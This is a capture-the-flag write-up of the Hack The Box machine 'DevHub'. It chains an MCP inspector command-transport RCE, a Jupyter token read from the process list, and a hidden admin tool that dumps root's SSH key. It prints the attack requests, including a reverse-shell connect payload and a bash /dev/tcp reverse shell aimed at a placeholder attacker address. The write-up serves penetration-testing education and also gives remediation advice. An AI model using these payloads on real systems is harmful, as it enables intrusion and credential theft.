---
title: "DevHub: MCP Command Transport RCE and a Root Tool Dump"
description: "An Easy Linux Hack The Box machine where an MCP inspector's command transport spawns an arbitrary process, a Jupyter token leaks in a process command line, and a root-owned tool service returns the root SSH private key."
type: case-study
platform: Hack The Box
exercise_type: machine
category: pentest
status: published-ready
addedAt: "2026-10-19"
tags:
  - htb
  - linux
  - machine
  - mcp
  - rce
  - jupyter
  - credential-leak
  - privilege-escalation
objective: "Move from unauthenticated access to the MCP inspector, through a command-transport RCE and a leaked Jupyter token, to a root-owned tool service that exposes the root SSH key."
tools:
  - rustscan
  - nmap
  - python3
  - curl
  - nc
  - ss
  - ssh
skill: "MCP transport abuse, process-argument credential recovery, and hidden-tool exploitation for privilege escalation."
outcome: "Code execution as the mcp-dev service account, a pivoted shell as analyst, and root SSH access from a dumped private key."
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux (Ubuntu), nginx landing page on port 80, MCPJam Inspector on port 6274, Jupyter and an internal tool service on localhost |
| Starting position | Unauthenticated |
| Objective | Reach root through the exposed MCP inspector and the internal services reachable after the foothold |
| Outcome | Code execution as `mcp-dev`, a shell as `analyst`, and root SSH access |

## MCP transport abuse to root

DevHub is an Easy Linux box whose external surface is small: OpenSSH on port 22, an nginx page on port 80, and an MCPJam Inspector on port 6274. The inspector's `/api/mcp/connect` endpoint builds a server configuration from a caller-supplied `command`, and the underlying Node.js `child_process` spawn runs that command as the `mcp-dev` service account. That gives code execution without any credential. A shell as `mcp-dev` is enough to read the local process list, where a Jupyter server running as `analyst` has its authentication token sitting in the command line. A terminal created through Jupyter's REST API and driven over its WebSocket returns a shell as `analyst`. The last boundary is a root-owned tool service called OPSMCP on localhost:5000, whose API key is hardcoded in a source file that `analyst` can read, and which exposes a hidden `ops._admin_dump` tool that reads the root SSH private key.

I kept the recorded request shapes and replaced target addresses, the Jupyter token, the OPSMCP API key, and the recovered private key with placeholders; command syntax is preserved.

**Attack path:**

1. MCPJam Inspector on port 6274.
2. `/api/mcp/connect` command transport spawns a process as `mcp-dev`.
3. Jupyter token recovered from the process command line.
4. Terminal session over the Jupyter WebSocket as `analyst`.
5. OPSMCP API key read from `/opt/opsmcp/server.py`.
6. Hidden `ops._admin_dump` tool returns the root SSH private key.
7. SSH login as root with the recovered key.

## Target, service discovery, and objective

The target is a Hack The Box lab machine. Scope was the three reachable services, the files and local services visible after the foothold, and the internal web applications bound to localhost. The objective was to cross from an unauthenticated position to root and to record each trust boundary along the way.

The source note contains the payloads and the key service responses but not the interactive shell transcripts for the `mcp-dev` and `analyst` stages, so those transitions are reconstructed from the recorded request shapes and command lines. Ports, paths, and service banners below come from the recorded output.

## Evidence: MCP transport RCE to a root tool dump

### Service discovery

Observation: a full-port scan returned three open ports, with the service on 6274 unidentified by version probes.

Action:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/DevHub-TCP
```

Result:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings:
|   GetRequest:
|     <title>MCPJam Inspector</title>
```

Significance: nginx redirects to a virtual host, and port 6274 serves a named application rather than a mapped service, so both deserve a direct HTTP look. The version probe matched the Inspector by its page title.

### Web surface and the inspector API

The landing page describes three internal services: the MCP inspector on 6274, an analytics dashboard running Jupyter on localhost:8888, and an internal Git server in maintenance mode. The inspector's JavaScript bundle lists its API surface.

```text
/api/mcp/connect
/api/mcp/tools/list
/api/mcp/tools/execute
/api/mcp/servers
/api/mcp/resources/list
```

Significance: `/api/mcp/connect` accepts a `serverConfig` object with a `command` transport. The endpoint passes that command to Node.js `child_process`, which means the caller chooses the process the inspector starts. A connection that fails still starts the process.

### Command transport to code execution

Observation: the connect endpoint does not validate which program the caller asks it to run.

Action: the source records a Python request that starts a shell back to the listener using the `command` transport.

```python
import requests

target = "http://devhub.htb:6274"
data = {
    "serverConfig": {
        "command": "python3",
        "args": ["-c", "import socket,subprocess,os; ..."],  # reverse shell to <ATTACKER_IP>:<LPORT>
        "env": {}
    },
    "serverId": "revshell",
}
r = requests.post(f"{target}/api/mcp/connect", json=data)
print(r.status_code, r.text)
```

```bash
nc -lvnp <LPORT>
```

Result: the documented result is command execution as the `mcp-dev` user.

```text
mcp-dev@devhub:/$
```

Significance: this is unauthenticated remote code execution in a privileged service account's context, and the payload needs no MCP protocol implementation because the spawned program does not have to speak JSON-RPC. The source notes that the connection closes when the process exits, and that the user flag is not readable as `mcp-dev`, so the recorded path continues with lateral movement. The shell transcript itself is not part of the source; the stage is reconstructed from the recorded request.

### Jupyter token recovered from the process arguments

Observation: local process enumeration as `mcp-dev` shows a Jupyter server started as another user.

Action:

```bash
ps aux | grep jupyter
```

Result:

```text
analyst  1077  ... /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 \
  --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=<JUPYTER_TOKEN>
```

Significance: the token is passed as a command-line argument, so it is readable in the process list by any local user. Jupyter accepts that token for both its REST API and its WebSocket endpoints, which lets a lower-privileged account act as `analyst`.

### Terminal session as analyst

Observation: Jupyter's REST API can create terminal sessions, and those sessions run as the Jupyter user.

Action: create a terminal, then connect to its WebSocket and send the shell command as a `stdin` message.

```bash
curl -s -X POST "http://localhost:8888/api/terminals" \
  -H "Authorization: token <JUPYTER_TOKEN>"
```

```text
{"name": "1", ...}
```

The source includes a standard-library Python client that performs the WebSocket handshake and framing against `ws://localhost:8888/terminals/websocket/1?token=<JUPYTER_TOKEN>`, then sends `["stdin", "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'\n"]`.

Result: the documented result is a shell as `analyst`.

Significance: the leaked token converts a local-only service into a session for the account that owns it. Jupyter's API makes that interactive, since a terminal is a shell by design rather than an unintended side effect. The source records the callback shell but not its prompt, so this transition is reconstructed from the client script.

### OPSMCP API key and hidden tools

Observation: as `analyst`, a second service listens on localhost:5000.

Action:

```bash
ss -tlnp | grep 5000
```

```text
LISTEN  0  128  127.0.0.1:5000  0.0.0.0:*  users:(("python3",pid=1084,fd=...))
```

```bash
curl http://localhost:5000/
```

```json
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],
 "server":"OPSMCP","status":"operational","version":"2.1.0"}
```

The service source lives at `/opt/opsmcp/server.py` and is readable by `analyst`. It contains a hardcoded key and a set of tools that `/tools/list` does not return.

```python
VALID_API_KEY="<OPSMCP_API_KEY>"

HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {"description": "Enable debug mode", "parameters": {}}
}
```

Significance: the API key grants access to a service that runs in a different privilege context, and the source file that holds the key is readable by the account that needs it. The hidden tool is not discoverable through the public tool listing, so the tool list alone would not have surfaced the escalation path.

### Root private key through the admin tool

Observation: the hidden `ops._admin_dump` tool supports a `target` parameter that includes `ssh_keys`.

Action:

```bash
curl -s -X POST http://localhost:5000/tools/call \
  -H "X-API-Key: <OPSMCP_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Result: the response returns the root SSH private key for the target.

```json
{"note":"Emergency recovery key dump",
 "root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n<ROOT_PRIVATE_KEY>",
 "target":"ssh_keys"}
```

The recorded key is saved to a file with `chmod 600` and used for an SSH login as root.

```bash
ssh -i root_key root@<TARGET_IP>
```

Significance: the service treats a caller-supplied tool name and parameter as trusted, and it runs in a context that can read root's home directory. A key stored in the same readable source file as the tool makes the escalation a single request once `analyst` is reached.

## Outcome: MCP transport to root

The path crosses three boundaries. The inspector converts an unauthenticated HTTP request into process execution as its own service account. A credential in the command line of a local process turns that foothold into a shell as a second user. A hardcoded key beside root-owned tool code turns that user into root.

Two limitations in the source affect the record. The `mcp-dev` and `analyst` shell transcripts are not included, so both transitions are reconstructed from the recorded payloads and commands rather than shown end to end. The OPSMCP tool dump returns a truncated key in the note, so the SSH login is recorded but the key material is not reproduced.

## Recommendations: transports, credentials, and tool boundaries

The transport is the entry point.

- *Recommendation:* do not build a process spawn from a caller-supplied transport configuration. If an MCP-style connect endpoint must exist, bind it to an allowlist of known servers, run it without a privileged service account, and require authentication before it can start a process.
- *Detection:* alert on an inspector process that spawns a shell, a network client, or any program outside its expected server set, and on outbound connections from the inspector host to an unauthorized address.
- *Validation:* test the connect endpoint with a benign command and confirm it is rejected unless the server is on the allowlist.

Credentials on the command line are visible to every local user.

- *Recommendation:* pass service tokens through environment files or a secret store instead of command-line arguments, and restart services that hold credentials this way.
- *Detection:* search process command lines for token and key patterns, and alert on reads of `/proc/<pid>/cmdline` by unexpected accounts.
- *Validation:* after a configuration change, confirm the token does not appear in `ps` output or in the process arguments read from `/proc`.

A privileged tool service is only as strong as its key handling.

- *Recommendation:* store the API key in a root-owned file with restricted mode, not in the service source, and remove or gate administrative tools such as `ops._admin_dump` behind an explicit privileged path.
- *Detection:* log calls to hidden or administrative tool names, including rejected ones, and alert when a non-administrative account reaches the tool service.
- *Validation:* confirm the tool list a normal client sees excludes administrative tools, and that an unauthenticated call fails.

## References

- [Hack The Box: DevHub](https://app.hackthebox.com/machines/DevHub)
- [Model Context Protocol: transports and servers](https://modelcontextprotocol.io/docs/concepts/transports)
- [Jupyter Server: REST API and terminals](https://jupyter-server.readthedocs.io/en/latest/developers/rest-api.html)
- [Node.js: child_process](https://nodejs.org/api/child_process.html)
- [RustScan](https://github.com/RustScan/RustScan)
- [Nmap](https://nmap.org/)
